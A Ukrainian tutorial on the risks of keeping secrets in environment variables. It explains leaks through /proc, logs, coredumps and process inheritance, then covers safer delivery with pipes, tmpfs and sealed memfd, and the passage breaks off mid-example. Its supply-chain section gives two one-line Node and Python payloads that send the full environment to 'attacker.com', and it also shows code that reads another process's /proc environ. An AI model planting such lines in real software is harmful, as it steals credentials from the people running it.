# Секрети в середовищі

<preknowlist>
- [Аргументи, оточення й що успадковує дитина](root:sys-unix/argv-and-environment) — структура початкового стека, масив envp та механіка передачі середовища при execve.
- [Системний виклик fork](root:sys-unix/fork-semantics) — клонування адресного простору й дублювання стану процесу.
- [Заміна образу процесу execve](root:sys-unix/exec-semantics) — створення нового адресного простору та ініціалізація початкової пам'яті.
- [/proc/$PID/ та стан процесів](root:sys-unix/procfs-process-reflection) — псевдофайлова система procfs і доступ до пам'яті та дескрипторів.
</preknowlist>

Веб-сервіс обробки платежів запускається всередині контейнера з обліковими даними бази даних у змінній оточення `DB_PASSWORD=SecretKey99!`. Під час генерації PDF-звіту бекенд виконує системну утиліту `wkhtmltopdf` через виклик `execve()`, передаючи їй за замовчуванням поточний масив `environ`. Якщо сторонній бінарник утиліти скомпрометовано через вразливість у парсері шрифтів або сторонній плагін, зловмисник отримує доступ до пароля бази даних навіть без прав суперкористувача root — просто зчитавши власний масив змінних або переглянувши пам'ять батьківського процесу через `/proc/$PID/environ`. Будь-який неперехоплений виняток у коді, що потрапляє до системи відстеження помилок Sentry чи загального журналу діагностики, миттєво публікує повний зріз змінних середовища у відкритому вигляді.

Змінні середовища (Environment Variables) створювалися в операційних системах Unix наприкінці 1970-х років як простий текстовий механізм передачі контексту сесії між процесами: шляхів пошуку виконуваних файлів `PATH`, локалі `LANG` або налаштувань термінала `TERM`. Перетворення цього механізму на сховище криптографічних ключів, токенів доступу та паролів стало наслідком широкого розповсюдження маніфесту Twelve-Factor App, де змінні оточення проголошувалися універсальним місцем зберігання будь-якої конфігурації. Проте фундаментальна модель безпеки ядра Linux не забезпечує для `environ` жодної ізоляції, шифрування чи гранулярного контролю доступу.

## 1. Парадигма 12-Factor App та ілюзія безпеки оточення

Механізм змінних середовища з'явився у сьомій редакції Unix (Unix V7, 1979 рік) разом із командною оболонкою Стівена Борна (Bourne Shell). Його призначенням було забезпечення глобального контексту виконання для ієрархії процесів користувача: визначення домашнього каталогу (`HOME`), типу дисплея або термінала (`TERM`) та системних шляхів до двійкових утиліт (`PATH`).

Через три десятиліття, на початку 2010-х років, інженери хмарної платформи Heroku опублікували маніфест «Twelve-Factor App», покликаний стандартизувати створення хмарних мікросервісів. Третій розділ маніфесту (Config) сформулював категоричне правило: «Зберігайте конфігурацію в середовищі». Логіка авторів спиралася на кілька очевидних практичних переваг:
- Повне відокремлення коду програми від конфігурації платформи;
- Запобігання випадковому додаванню паролів у репозиторії контролю версій Git;
- Уніфікований інтерфейс перевизначення параметрів під час запуску в контейнерах (`docker run -e`) або маніфестах Kubernetes Pod.

Проте автори маніфесту припустилися концептуальної помилки в моделі загроз: вони штучно об'єднали нечутливу оперативну конфігурацію запуску та високоелектропійні криптографічні секрети в єдиний механізм.

```
┌────────────────────────────────────────────────────────────────────────┐
│               Концептуальна плутанина 12-Factor App                     │
├──────────────────────────────────┬─────────────────────────────────────┤
│   Нечутлива конфігурація         │     Криптографічні секрети          │
│   (Operational Configuration)    │     (Credentials & Private Keys)    │
├──────────────────────────────────┼─────────────────────────────────────┤
│ • PORT=8080                      │ • DB_PASSWORD=TopSecret99           │
│ • LOG_LEVEL=debug                │ • AWS_SECRET_ACCESS_KEY=wJalr...    │
│ • TIMEOUT_MS=5000                │ • JWT_SIGNING_KEY=d8f1e0...c4       │
│ • WORKER_COUNT=4                 │ • TLS_PRIVATE_KEY=-----BEGIN...     │
├──────────────────────────────────┼─────────────────────────────────────┤
│ Властивості: публічні дані,      │ Властивості: висока ентропія,       │
│ безпечні для експорту в логи     │ вимагають захисту від читання,      │
│ та успадкування нащадками.       │ ізоляції від дочірніх процесів      │
│                                  │ та негайного очищення пам'яті.      │
└──────────────────────────────────┴─────────────────────────────────────┘
```

У стандарті POSIX середовище процесу реалізоване як глобальний покажчик `char **environ` на нуль-термінований масив покажчиків на рядки формату `KEY=VALUE`. З погляду ядра Linux цей масив розташовується у звичайній пам'яті процесу: або на верхівці початкового стека користувача при запуску через `execve()`, або в купі після динамічних викликів `setenv()` чи `putenv()`.

Оточення не має жодних атрибутів захисту:
1. **Відсутність гранулярного контролю доступу**: Будь-який суб'єкт, що має право переглядати середовище процесу (ядро, зневаджувач, інструменти моніторингу або сам процес), отримує доступ до всіх змінних одночасно. Неможливо позначити змінну `PORT` як відкриту, а `DB_PASSWORD` — як конфіденційну;
2. **Відкрите зберігання в пам'яті**: Рядки зберігаються у відкритому вигляді без шифрування та не захищені від копіювання у вторинні структури даних;
3. **Відсутність захисту від дампів**: Пам'ять середовища за замовчуванням включається у повний аварійний дамп пам'яті (coredump);
4. **Неконтрольоване розповсюдження**: Семантика системних викликів `fork()` та `execve()` передбачає автоматичне просування всього блоку середовища у всі дочірні процеси дерева виконання.

## 2. Анатомія витоків: вектори несанкціонованого доступу

Коли секрет потрапляє в масив `environ`, він стає вразливим до чотирьох незалежних векторів витоку в системі, показаних на схемі нижче.

![Вектори витоків секретів зі змінних середовища](/root/sys/sys-unix/secrets-in-environment/img/environ-leak-vectors.svg)
*Вектори витоків конфіденційних даних зі змінних середовища: доступ через procfs, успадкування процесами-нащадками, аварійні дампи пам'яті та діагностичні логи.*

### Вектор 1: Псевдофайлова система `/proc/$PID/environ` та пастка unsetenv()

Псевдофайлова система procfs експортує стан кожного процесу у вигляді віртуальних файлів. Для кожного активного ідентифікатора процесу `PID` ядро створює файл `/proc/$PID/environ`, який містить початковий блок змінних середовища процесу, розділених нульовими байтами `\0`.

Усередині ядра Linux адреси початку та кінця початкового середовища зберігаються в дескрипторі пам'яті процесу `mm_struct` у полях `env_start` та `env_end`:

:::tabs
```c
/* Фрагмент структури mm_struct ядра Linux (include/linux/mm_types.h) */
struct mm_struct {
    unsigned long arg_start, arg_end;
    unsigned long env_start, env_end;
    /* ... */
};
```
```cpp
// Концептуальне відображення меж середовища у просторі пам'яті процесу
#include <cstdint>
#include <span>

struct ProcessMemoryBounds {
    std::uintptr_t arg_start{0};
    std::uintptr_t arg_end{0};
    std::uintptr_t env_start{0};
    std::uintptr_t env_end{0};

    [[nodiscard]] std::size_t environment_size() const noexcept {
        return (env_end >= env_start) ? (env_end - env_start) : 0;
    }
};
```
:::

Коли будь-який процес виконує системний виклик `read()` для файлу `/proc/$PID/environ`, ядро викликає внутрішню функцію `environ_read()` (`fs/proc/base.c`). Ядро перевіряє права доступу за допомогою функції `ptrace_may_access()` з прапорцем `PTRACE_MODE_READ_FSCREDS`.

Перевірка `ptrace_may_access()` завершується успішно за однієї з двох умов:
1. Викликаючий процес має адміністративний привілей `CAP_SYS_PTRACE` (або запущений від імені суперкористувача `root`);
2. Реальний, ефективний та збережений UID викликаючого процесу збігаються з реальним, ефективним та збереженим UID цільового процесу (той самий користувач у системі).

Це означає, що якщо на сервері або всередині одного контейнера під одним обліковим записом користувача (наприклад, `www-data`, `app` або `node`) працюють кілька процесів, будь-який із них може безперешкодно зчитати секрети всіх інших процесів:

:::tabs
```c
/* Читання чужого середовища через /proc/$PID/environ мовою C */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

void dump_process_environ(pid_t target_pid) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/environ", target_pid);

    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        perror("open /proc/$PID/environ");
        return;
    }

    char buf[4096];
    ssize_t bytes_read;
    while ((bytes_read = read(fd, buf, sizeof(buf))) > 0) {
        for (ssize_t i = 0; i < bytes_read; ++i) {
            if (buf[i] == '\0') {
                putchar('\n');
            } else {
                putchar(buf[i]);
            }
        }
    }
    close(fd);
}
```
```cpp
// Ідіоматичне читання середовища процесу через std::filesystem та std::string мовою C++
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <filesystem>
#include <system_error>

void dump_process_environ(int target_pid) {
    const std::filesystem::path proc_path = "/proc/" + std::to_string(target_pid) + "/environ";
    
    std::ifstream file(proc_path, std::ios::binary);
    if (!file.is_open()) {
        std::cerr << "Не вдалося відкрити " << proc_path << '\n';
        return;
    }

    std::string entry;
    while (std::getline(file, entry, '\0')) {
        if (!entry.empty()) {
            std::cout << "[ENV] " << entry << '\n';
        }
    }
}
```
:::

#### Пастка unsetenv() та динамічної купи

Поширеною помилкою серед розробників є переконання, що зчитавши секрет під час старту програми, його можна безпечно видалити за допомогою виклику `unsetenv("DB_PASSWORD")` або `delete process.env.DB_PASSWORD`.

Проте реалізація функцій керування оточенням у стандартній бібліотеці glibc працює виключно у просторі користувача. Під час виклику `setenv()` або `unsetenv()` glibc виділяє новий масив покажчиків у динамічній пам'яті (купі, Heap) і перенаправляє глобальний покажчик `environ` на цей новий буфер.

При цьому покажчики `mm_struct->env_start` та `mm_struct->env_end` усередині ядра Linux **залишаються незмінними**. Вони продовжують вказувати на початковий сегмент пам'яті на верхівці стека, куди ядро скопіювало рядки під час виклику `execve()`.

```
[Початковий стек процесу] ────────► [env_start ... env_end] (DB_PASSWORD=Secret!)
                                            ▲
                                            │ /proc/$PID/environ продовжує читати тут!
[Купа процесу після unsetenv] ──► environ = [PATH, LANG, NULL] (DB_PASSWORD видалено)
```

В результаті виникає фундаментальна розбіжність:
- Функція `getenv("DB_PASSWORD")` усередині процесу повертає `NULL`;
- Системний файл `/proc/$PID/environ` продовжує віддавати початковий рядок `DB_PASSWORD=SecretKey99!` усім локальним процесам того самого користувача.

Оновити межі ядра `env_start`/`env_end` може лише привілейований процес через спеціальний системний виклик `prctl(PR_SET_MM, PR_SET_MM_ENV_START, ...)` з наявністю адміністративного привілею `CAP_SYS_RESOURCE`. Для звичайних непривілейованих програм секрет залишається видимим у `/proc/$PID/environ` протягом усього часу життя процесу.

### Вектор 2: Логи налагодження, APM-агенти та діагностичні трекери

Змінні середовища сприймаються стандартними бібліотеками більшості мов програмування як глобальний словник без позначок конфіденційності (`process.env` у Node.js, `os.environ` у Python, `System.getenv()` у Java, `os.Environ()` у Go).

Коли в системі виникає неперехоплений виняток:
- Системи збору помилок (Sentry, Rollbar, Bugsnag) автоматично збирають контекст оточення процесу для полегшення відлагодження й передають його на зовнішні хмарні сервери;
- Агенти моніторингу продуктивності (Application Performance Monitoring, APM: Datadog, New Relic, Dynatrace) серіалізують змінні середовища під час ініціалізації процесу для виявлення версії релізу та метаданих хоста;
- Веб-фреймворки в режимі розробки або помилок конфігурації (наприклад, сторінка помилки Django Debug, Spring Boot `/actuator/env`, Express error handler) виводять `env` у відповідь HTTP клієнту;
- Оболонки Bash та скрипти автоматизації CI/CD із прапорцем діагностики `set -x` або командами `env` / `printenv` записують усі змінні у відкритий текстовий журнал збірки, доступний усім розробникам репозиторію.

### Вектор 3: Дампи аварійної пам'яті (Coredump) та файл підкачки (Swap)

Коли процес зазнає критичного збою внаслідок звернення до недійсної адреси пам'яті (`SIGSEGV`), помилки шини (`SIGBUS`) чи виклику `abort()` (`SIGABRT`), ядро Linux генерує дамп пам'яті (coredump).

Дамп містить повний знімок адресного простору процесу на момент падіння, зокрема верхівку початкового стека користувача, де розташовані рядки `environ`, або блоки динамічної пам'яті (купи), виділені функцією `setenv()`. Ядро записує цей дамп у файл `core.$PID` або передає системному демону `systemd-coredump` через механізм `/proc/sys/kernel/core_pattern`.

```
[Аварійне падіння процесу (SIGSEGV)]
              │
              ▼
[Ядро Linux: do_coredump()] ──► Записує сегменти пам'яті у /var/lib/systemd/coredump/
                                  │
                                  ├─► Стек: "DB_PASSWORD=SecretKey99!" (відкритий текст)
                                  ├─► Купа: сесійні токени
                                  └─► Доступ: розробники, аналізатори збоїв, бекапи
```

Якщо система не налаштована на використання шифрованих сховищ для coredump або адміністратор копіює дамп на локальний комп'ютер розробника для аналізу в зневаджувачі `gdb`, криптографічні ключі автоматично залишають периметр безпеки.

Крім того, якщо сторінки пам'яті зі змінними середовища не заблоковані від вивантаження на диск через системний виклик `mlock()`, під час нестачі оперативної пам'яті підсистема керування пам'яттю (Memory Management) ядра скидає ці сторінки у розділ або файл підкачки (`swap`). Навіть після завершення роботи процесу та вимкнення сервера секрети залишаються записаними на фізичному накопичувачі у відкритому вигляді.

### Вектор 4: Публічний доступ через командний рядок (argv)

Намагаючись уникнути використання змінних середовища, розробники нерідко припускаються ще гіршої помилки: передають паролі та токени безпосередньо в аргументах командного рядка під час виклику сторонніх утиліт (наприклад, `curl -u admin:SecretPassword https://api.internal/` або `mysql -u root -pSecretPassword`).

У моделі ядра Linux аргументи командного рядка процесу зберігаються в сегменті `[arg_start, arg_end]` і експортуються через псевдофайл `/proc/$PID/cmdline`. 

На відміну від `/proc/$PID/environ`, файл `/proc/$PID/cmdline` у стандартній конфігурації ядра Linux **доступний для читання взагалі будь-якому користувачеві в системі** без перевірок `ptrace_may_access()`. Будь-який непривілейований процес або команда `ps aux` може безперешкодно зчитувати повний список аргументів усіх працюючих у системі процесів.

## 3. Неконтрольоване успадкування: fork() та execve()

Одним із найнебезпечніших аспектів моделі процесів Unix є автоматичне просування змінних середовища вниз по дереву процесів.

Коли процес викликає `fork()`, ядро створює точну копію адресного простору за допомогою механізму Copy-On-Write. Дитячий процес отримує доступ до того самого масиву `environ`. 

На наступному кроці, коли процес викликає одну з функцій сімейства `exec()` (`execl`, `execv`, `execvp`, `system()`, `popen()` у C/C++, `subprocess.Popen(..., shell=False)` у Python або `child_process.exec()` у Node.js), стандартна бібліотека glibc неявно викликає системний виклик `execve()`, передаючи поточний глобальний покажчик `environ` третім аргументом:

:::tabs
```c
/* Стандартна бібліотека glibc викликає execve з глобальним environ */
#include <unistd.h>

extern char **environ;

int execvp(const char *file, char *const argv[]) {
    return execve(file, argv, environ); /* Усі секрети передаються нащадку! */
}
```
```cpp
// Концептуальне представлення неконтрольованої передачі оточення
#include <unistd.h>
#include <span>
#include <string_view>

extern char **environ;

namespace posix_wrapper {
    int execute_utility(std::string_view file, char *const argv[]) noexcept {
        // execve неявно отримує глобальний environ батьківського процесу
        return ::execve(file.data(), argv, environ);
    }
}
```
:::

### Сценарій витоку через сторонні утиліти

Уявімо типовий бекенд інтернет-магазину на Python або Node.js, що зберігає `STRIPE_API_SECRET_KEY` та `DATABASE_URL` у змінних середовища. Для стиснення аватарів користувачів застосунок викликає утиліту `convert` (ImageMagick) або `cwebp`:

```python
# Небезпечний виклик сторонньої утиліти в Python
import subprocess

# Батьківський процес містить у середовищі:
# AWS_SECRET_ACCESS_KEY, DB_PASSWORD, JWT_PRIVATE_KEY
subprocess.run(["convert", "user_input.jpg", "-resize", "128x128", "thumb.jpg"])
```

У цей момент утиліта `convert` отримує повну копію всіх секретів основного веб-сервера. Якщо утиліта ImageMagick містить вразливість переповнення буфера або виконання довільного коду (наприклад, класична серія вразливостей ImageTragick), атакуючий через спеціально сформований файл `user_input.jpg` отримує виконання коду в контексті `convert` і негайно зчитує `AWS_SECRET_ACCESS_KEY` зі свого власного масиву `environ`.

Утиліті для обробки зображень потрібні лише файлові шляхи вхідного та вихідного зображень, але через автоматичне успадкування POSIX вона отримує найцінніші криптографічні ключі інфраструктури.

### Атаки на ланцюг постачання (Supply Chain Attacks)

У сучасній екосистемі розробки (Node.js/npm, Python/PyPI, Rust/crates.io) застосунки використовують тисячі сторонніх бібліотек. Зловмисний або скомпрометований пакунок у глибині дерева залежностей виконується в тому самому адресному просторі процесу.

Для викрадення секретів шкідливому коду достатньо одного рядка:
- У Node.js: `https.request('https://attacker.com', { headers: { 'x-leak': JSON.stringify(process.env) } })`;
- У Python: `urllib.request.urlopen('https://attacker.com/?env=' + str(os.environ))`.

Оскільки змінні середовища є глобальними для процесу, жоден модуль не може бути обмежений у доступі до них на рівні інтерпретатора.

## 4. SetUID-програми, допоміжний вектор AT_SECURE та лічильник безпеки

Творці ядра Linux та бібліотеки glibc давно усвідомили катастрофічні наслідки неконтрольованого середовища для привілейованих процесів. Якщо звичайний користувач викликає SetUID-бінарник (наприклад, `/usr/bin/sudo` або `/usr/bin/passwd`), який виконується з правами `root` (`eUID = 0`), наявність контрольованих користувачем змінних середовища дозволяла б миттєво захопити контроль над системою.

Зокрема, змінна `LD_PRELOAD` змушує динамічний завантажувач ELF (`ld.so`) завантажити вказану спільну бібліотеку до виконання коду програми. Якби `ld.so` довіряв `LD_PRELOAD` у SetUID-програмі, зловмисник міг би перехопити функцію `main()` і виконати довільний код із привілеями суперкористувача.

### Механізм AT_SECURE у ядрі Linux

Для запобігання цій атаці ядро Linux під час виконання системного виклику `execve()` перевіряє, чи змінюються привілеї процесу. У файлі `fs/binfmt_elf.c` ядро оцінює зміну ідентифікаторів користувача та прапорців capabilities:

:::tabs
```c
/* Логіка визначення прапорця безпеки в ядрі Linux (fs/binfmt_elf.c) */
static int evaluate_secure_exec(struct linux_binprm *bprm) {
    if (bprm->cred->euid != current_euid() ||
        bprm->cred->egid != current_egid() ||
        !uid_eq(bprm->cred->uid, current_uid()) ||
        !gid_eq(bprm->cred->gid, current_gid()) ||
        !cap_issubset(bprm->cred->cap_permitted, current_cap_permitted())) {
            bprm->secureexec = 1;
    }
    return bprm->secureexec;
}
```
```cpp
// Концептуальна логіка верифікації зміни облікових даних процесу
#include <cstdint>
#include <concepts>

struct Credentials {
    std::uint32_t uid{0};
    std::uint32_t gid{0};
    std::uint32_t euid{0};
    std::uint32_t egid{0};
    std::uint64_t capabilities{0};
};

[[nodiscard]] constexpr bool is_privilege_transition(const Credentials& current, const Credentials& target) noexcept {
    return (target.euid != current.euid) ||
           (target.egid != current.egid) ||
           (target.uid  != current.uid)  ||
           (target.gid  != current.gid)  ||
           ((target.capabilities & ~current.capabilities) != 0);
}
```
:::

Якщо виявлено підвищення привілеїв, ядро передає динамічному лінкеру у складі Допоміжного вектора (Auxiliary Vector, `auxv`) спеціальний запис з типом `AT_SECURE`:

```
Elf64_auxv_t {
    a_type = AT_SECURE,  /* Значення 23 */
    a_val  = 1           /* Увімкнено режим підвищеної безпеки */
}
```

### Реакція glibc та функція secure_getenv()

Коли динамічний завантажувач `ld.so` виявляє `AT_SECURE = 1`, він активує режим безпечного виконання:
1. **Видалення небезпечних змінних**: Динамічний лінкер повністю ігнорує або видаляє зі списку понад 30 небезпечних змінних середовища: `LD_PRELOAD`, `LD_LIBRARY_PATH`, `LD_AUDIT`, `LD_DEBUG`, `GCONV_PATH`, `HOSTALIASES`, `MALLOC_CHECK_` тощо;
2. **Активація secure_getenv()**: Бібліотека glibc надає функцію `secure_getenv()` (у системах BSD та macOS її аналогом є перевірка `issetugid()`):

:::tabs
```c
/* Використання secure_getenv у системному програмуванні на C */
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>

void read_configuration(void) {
    /* secure_getenv повертає NULL, якщо процес виконується в захищеному режимі (AT_SECURE = 1) */
    const char *custom_path = secure_getenv("APP_PLUGIN_DIR");
    if (custom_path == NULL) {
        /* Безпечне значення за замовчуванням */
        custom_path = "/usr/lib/app/plugins";
    }
    printf("Шлях до плагінів: %s\n", custom_path);
}
```
```cpp
// Ідіоматична обгортка над secure_getenv у C++
#define _GNU_SOURCE
#include <cstdlib>
#include <string_view>
#include <optional>
#include <iostream>

namespace sys {
    [[nodiscard]] std::optional<std::string_view> get_secure_env(std::string_view name) noexcept {
        const char *val = ::secure_getenv(name.data());
        if (val == nullptr) {
            return std::nullopt;
        }
        return std::string_view(val);
    }
}

void read_configuration() {
    constexpr std::string_view default_path = "/usr/lib/app/plugins";
    const auto plugin_dir = sys::get_secure_env("APP_PLUGIN_DIR").value_or(default_path);
    std::cout << "Шлях до плагінів: " << plugin_dir << '\n';
}
```
:::

### Чому secure_getenv() не рятує користувацькі сервіси

Механізм `AT_SECURE` був спроектований виключно для захисту привілейованих двійкових файлів від атак непривілейованих користувачів.

Звичайний бекенд або мікросервіс запускається непривілейованим користувачем (`UID 1000`) і не має бітів SetUID. Тому для нього `AT_SECURE = 0`. Функція `secure_getenv()` поводиться як звичайний `getenv()`, динамічний лінкер не фільтрує жодних змінних, а ядро продовжує експортувати всі секрети через procfs і копіювати їх у всі дочірні процеси.

Покладатися на вбудовані механізми ядра для захисту паролів у середовищі неможливо — застосункам потрібні спеціалізовані архітектурні моделі передачі конфіденційних даних.

## 5. Архітектура безпечної передачі секретів у Linux

Для усунення фундаментальних вад змінних середовища сучасні Unix- та Linux-системи використовують чотири альтернативні моделі ізоляції секретів, зведені на архітектурній схемі.

![Моделі безпечної передачі секретів](/root/sys/sys-unix/secrets-in-environment/img/secure-secret-delivery-models.svg)
*Архітектурні альтернативи передачі секретів у Linux: анонімні канали (pipes), монтування tmpfs, анонімні дескриптори memfd_create з пломбуванням та зв'язки ключів ядра (Kernel Keyrings).*

### Модель 1: Передача через анонімні канали (Pipes) та виділені файлові дескриптори

Замість того, щоб укладати секрет у текстовий рядок `envp`, батьківський процес (наприклад, супервізор або ініціалізатор) створює односпрямований анонімний канал зв'язку через системний виклик `pipe2()` із прапорцем `O_CLOEXEC`.

Батьківський процес записує секрет у канал, налаштовує дескриптор читання на фіксований номер (наприклад, дескриптор `3`), знімає з нього прапорець `O_CLOEXEC` і виконує `execve()` з **порожнім або очищеним середовищем**. Дочірній процес зчитує секрет із дескриптора `3`, після чого негайно закриває його.

Переваги моделі:
- Секрет ніколи не з'являється у `/proc/$PID/environ` або `/proc/$PID/cmdline`;
- Інші дочірні процеси, запущені паралельно чи пізніше, не отримають дескриптор, оскільки прапорець `O_CLOEXEC` або явне закриття дескриптора унеможливлює витік;
- Дані існують у буфері ядра лише на мить читання.

Нижче наведено робочий приклад реалізації безпечної передачі секрету через анонімний пайп:

:::tabs
```c
/* Безпечна передача секрету нащадку через анонімний пайп мовою C */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/wait.h>

#define SECRET_FD 3

void run_child_secure(int read_fd) {
    /* Перенаправляємо read_fd на фіксований SECRET_FD (3) */
    if (read_fd != SECRET_FD) {
        if (dup2(read_fd, SECRET_FD) < 0) {
            perror("dup2");
            exit(EXIT_FAILURE);
        }
        close(read_fd);
    }

    /* Знімаємо O_CLOEXEC з SECRET_FD, щоб він зберігся після execve */
    int flags = fcntl(SECRET_FD, F_GETFD);
    fcntl(SECRET_FD, F_SETFD, flags & ~FD_CLOEXEC);

    /* Очищене середовище: жодних паролів у envp */
    char *const clean_env[] = {
        "PATH=/usr/bin:/bin",
        "LANG=C.UTF-8",
        NULL
    };

    char *const child_args[] = {
        "/usr/local/bin/worker",
        "--secret-fd=3",
        NULL
    };

    execve(child_args[0], child_args, clean_env);
    perror("execve");
    exit(EXIT_FAILURE);
}

int main(void) {
    int fds[2];
    if (pipe2(fds, O_CLOEXEC) < 0) {
        perror("pipe2");
        return EXIT_FAILURE;
    }

    pid_t pid = fork();
    if (pid < 0) {
        perror("fork");
        return EXIT_FAILURE;
    }

    if (pid == 0) {
        /* Дочірній процес: закриваємо записуючий кінець */
        close(fds[1]);
        run_child_secure(fds[0]);
    } else {
        /* Батьківський процес: закриваємо читаючий кінець */
        close(fds[0]);

        const char secret_data[] = "SuperSecret_Database_Token_2026";
        ssize_t written = write(fds[1], secret_data, sizeof(secret_data));
        (void)written;

        /* Закриття fds[1] надсилає EOF дочірньому процесу */
        close(fds[1]);

        waitpid(pid, NULL, 0);
    }
    return EXIT_SUCCESS;
}
```
```cpp
// Безпечна передача секрету нащадку через RAII та пайпи мовою C++
#include <iostream>
#include <vector>
#include <string_view>
#include <system_error>
#include <unistd.h>
#include <fcntl.h>
#include <sys/wait.h>

class UniqueFd {
    int fd_{-1};
public:
    explicit UniqueFd(int fd = -1) noexcept : fd_(fd) {}
    ~UniqueFd() { reset(); }

    UniqueFd(const UniqueFd&) = delete;
    UniqueFd& operator=(const UniqueFd&) = delete;

    UniqueFd(UniqueFd&& other) noexcept : fd_(other.release()) {}
    UniqueFd& operator=(UniqueFd&& other) noexcept {
        if (this != &other) {
            reset(other.release());
        }
        return *this;
    }

    [[nodiscard]] int get() const noexcept { return fd_; }
    [[nodiscard]] bool is_valid() const noexcept { return fd_ >= 0; }

    int release() noexcept {
        int old = fd_;
        fd_ = -1;
        return old;
    }

    void reset(int new_fd = -1) noexcept {
        if (fd_ >= 0) {
            ::close(fd_);
        }
        fd_ = new_fd;
    }
};

void run_child(UniqueFd read_end) {
    constexpr int target_fd = 3;
    if (read_end.get() != target_fd) {
        if (::dup2(read_end.get(), target_fd) < 0) {
            std::exit(EXIT_FAILURE);
        }
        read_end.reset();
    }

    // Знімаємо прапорець FD_CLOEXEC з дескриптора target_fd
    int flags = ::fcntl(target_fd, F_GETFD);
    ::fcntl(target_fd, F_SETFD, flags & ~FD_CLOEXEC);

    char *const clean_env[] = {
        const_cast<char*>("PATH=/usr/bin:/bin"),
        const_cast<char*>("LANG=C.UTF-8"),
        nullptr
    };

    char *const child_argv[] = {
        const_cast<char*>("/usr/local/bin/worker"),
        const_cast<char*>("--secret-fd=3"),
        nullptr
    };

    ::execve(child_argv[0], child_argv, clean_env);
    std::exit(EXIT_FAILURE);
}

int main() {
    int raw_fds[2];
    if (::pipe2(raw_fds, O_CLOEXEC) < 0) {
        std::cerr << "Помилка pipe2\n";
        return EXIT_FAILURE;
    }

    UniqueFd read_pipe(raw_fds[0]);
    UniqueFd write_pipe(raw_fds[1]);

    pid_t pid = ::fork();
    if (pid < 0) {
        std::cerr << "Помилка fork\n";
        return EXIT_FAILURE;
    }

    if (pid == 0) {
        write_pipe.reset(); // Закриваємо записуючий дескриптор
        run_child(std::move(read_pipe));
    } else {
        read_pipe.reset();  // Закриваємо читаючий дескриптор
        
        constexpr std::string_view secret = "SuperSecret_Database_Token_2026";
        ::write(write_pipe.get(), secret.data(), secret.size());
        write_pipe.reset(); // Закриття викликає EOF у дочірньому процесі

        ::waitpid(pid, nullptr, 0);
    }
    return EXIT_SUCCESS;
}
```
:::

### Модель 2: Тимчасові захищені файлові системи (tmpfs) та Secret Mounts

У цій моделі секрети розміщуються не у змінних середовища, а у вигляді файлів на віртуальній файловій системі в оперативній пам'яті (`tmpfs` або `ramfs`).

Сучасні оркестратори та системні менеджери підтримують цей підхід на рівні стандартних інтерфейсів:
1. **Kubernetes Secret Volumes**: Об'єкти Kubernetes Secrets монтуються у файлову систему контейнера як том типу `tmpfs` (наприклад, у каталог `/var/run/secrets/`). Файли мають суворі права доступу (`0400` або `0600`).
2. **systemd Credentials**: Починаючи з версії systemd 250, сервіси можуть використовувати директиви `SetCredential=` або `LoadCredential=`. Демон systemd автоматично створює захищений тимчасовий каталог `/run/credentials/<service-name>/`, монтує туди `tmpfs` і відкриває доступ виключно користувачу відповідного сервісу. Шлях до каталогу передається через змінну `$CREDENTIALS_DIRECTORY`.

Застосунок відкриває файл секрету, зчитує його вміст у внутрішній буфер, блокує буфер у пам'яті через `mlock()` і негайно занулює пам'ять після використання за допомогою `explicit_bzero()`.

### Модель 3: Анонімні об'єкти пам'яті memfd_create з пломбуванням

Для передачі великих криптографічних ключів, сертифікатів TLS або бінарних конфігурацій між незалежними процесами без запису на диск Linux надає системний виклик `memfd_create()`.

`memfd_create()` створює анонімний файл у пам'яті ядра (`shmem`), який повертається процесу у вигляді звичайного файлового дескриптора. Головною особливістю `memfd` є підтримка механізму пломбування (File Sealing):

:::tabs
```c
/* Створення запечатаного секретного буфера через memfd_create мовою C */
#define _GNU_SOURCE
#include <sys/mman.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <stdio.h>

int create_sealed_secret_fd(const char *secret, size_t len) {
    /* Створюємо анонімний дескриптор пам'яті з дозволом пломбування */
    int fd = memfd_create("secure_secret_blob", MFD_CLOEXEC | MFD_ALLOW_SEALING);
    if (fd < 0) {
        perror("memfd_create");
        return -1;
    }

    /* Виділяємо необхідний розмір та записуємо секрет */
    if (ftruncate(fd, (off_t)len) < 0) {
        perror("ftruncate");
        close(fd);
        return -1;
    }

    if (write(fd, secret, len) != (ssize_t)len) {
        perror("write");
        close(fd);
        return -1;
    }

    /* Накладаємо незворотні пломби: заборона запису, стиснення, розширення та зміни пломб */
    if (fcntl(fd, F_ADD_SEALS, F_SEAL_WRITE | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_SEAL) < 0) {
        perror("fcntl F_ADD_SEALS");
        close(fd);
        return -1;
    }

    /* Повертаємо покажчик читання на початок */
    lseek(fd, 0, SEEK_SET);
    return fd;
}
```
```cpp
// Створення запечатаного буфера memfd мовою C++ з використанням std::span
#define _GNU_SOURCE
#include <sys/mman.h>
#include <unistd.h>
#include <fcntl.h>
#include <string_view>
#include <span>
#include <optional>
#include <iostream>

class SealedSecretBuffer {
    int fd_{-1};
public:
    explicit SealedSecretBuffer(int fd) noexcept : fd_(fd) {}
    ~SealedSecretBuffer() {
        if (fd_ >= 0) {
            ::close(fd_);
        }
    }

    SealedSecretBuffer(const SealedSecretBuffer&) = delete;
    SealedSecretBuffer& operator=(const SealedSecretBuffer&) = delete;

    SealedSecretBuffer(SealedSecretBuffer&& o) noexcept : fd_(o.fd_) { o.fd_ = -1; }
    SealedSecretBuffer& operator=(SealedSecretBuffer&& o) noexcept {
        if (this != &o) {
            if (fd_ >= 0) ::close(fd_);
            fd_ = o.fd_;
            o.fd_ = -1;
        }
        return *this;
    }

    [[nodiscard]] int descriptor() const noexcept { return fd_; }

    static std::optional<SealedSecretBuffer> create(std::string_view secret_data) noexcept {
        int fd = ::memfd_create("cpp_sealed_secret", MFD_CLOEXEC | MFD_ALLOW_SEALING);
        if (fd < 0) return std::nullopt;

        if (::ftruncate(fd, static_cast<off_t>(secret_data.size())) < 0) {
            ::close(fd);
            return std::nullopt;
        }

        if (::write(fd, secret_data.data(), secret_data.size()) != static_cast<ssize_t>(secret_data.size())) {
            ::close(fd);
            return std::nullopt;
        }

        // Встановлюємо пломби
